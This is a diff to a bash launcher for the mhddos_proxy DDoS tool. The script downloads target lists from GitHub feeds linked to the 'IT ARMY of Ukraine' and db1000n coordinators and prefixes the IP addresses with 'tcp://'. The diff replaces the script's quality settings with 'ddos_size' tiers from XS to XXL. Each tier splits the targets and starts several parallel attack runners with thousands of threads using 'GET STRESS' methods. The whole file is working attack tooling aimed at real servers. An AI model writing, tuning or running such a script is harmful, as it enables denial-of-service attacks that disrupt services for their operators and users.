@@ -12,7 +12,8 @@ gotop="on"
 db1000n="off"
 vnstat="off"
 proxy_finder="off"
-export quality_settings="default"
+export methods="--http-methods GET STRESS"
+export ddos_size="L"
 
 # create swap file if system doesn't have it. Helps systems with very little RAM.
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
@@ -37,7 +38,10 @@ rm -rf ~/multidd/targets/*
 echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
 # 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > ~/multidd/targets/source2.txt
-echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr')" > ~/multidd/targets/source3.txt
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr | select (. != null)')" > ~/multidd/targets/source3.txt
+
+# add 'tcp://' to all ip addresses
+sed -i -e 's/^/tcp:\/\//g' ~/multidd/targets/source3.txt
 
 # skip wrong lines in sources (those happens) and combine all sources together in single file all_targets.txt
 cat ~/multidd/targets/source* | while read LINE; do
@@ -102,11 +106,12 @@ while [ "$1" != "" ]; do
         +d | --db1000n )   db1000n="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
-        --potato ) export quality_settings="potato"; shift ;;
-        --low ) export quality_settings="low"; shift ;;
-        --medium ) export quality_settings="medium"; shift ;;
-        --high ) export quality_settings="high"; shift ;;
-        --ultra ) export quality_settings="ultra"; shift ;;
+        --XS ) export ddos_size="XS"; shift ;;
+        --S ) export ddos_size="S"; shift ;;
+        --M ) export ddos_size="M"; shift ;;
+        --L ) export ddos_size="L"; shift ;;
+        --XL ) export ddos_size="XL"; shift ;;
+        --XXL ) export ddos_size="XXL"; shift ;;
 #        --plite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
@@ -126,27 +131,27 @@ while true; do
     cd ~/multidd/mhddos_proxy
     python3 -m pip install -r requirements.txt
 
-    if [[ $quality_settings == "potato" ]]; then
-        tail -n 500 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
+    if [[ $ddos_size == "XS" ]]; then
+        tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 1000 $args_to_pass &
-    elif [[ $quality_settings == "low" ]]; then
+    elif [[ $ddos_size == "S" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 2000 $args_to_pass &
-    elif [[ $quality_settings == "medium" ]]; then
+    elif [[ $ddos_size == "M" ]]; then
         cd ~/multidd/targets/; split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2000 $args_to_pass &
-    elif [[ $quality_settings == "default" ]]; then
+    elif [[ $ddos_size == "L" ]]; then
         cd ~/multidd/targets/; split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 4000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 4000 $args_to_pass &
-    elif [[ $quality_settings == "high" ]]; then
+    elif [[ $ddos_size == "XL" ]]; then
         cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 4 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2500 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2500 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 2500 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 2500 $args_to_pass &
-    elif [[ $quality_settings == "ultra" ]]; then
+    elif [[ $ddos_size == "XXL" ]]; then
         cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 5000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 5000 $args_to_pass &
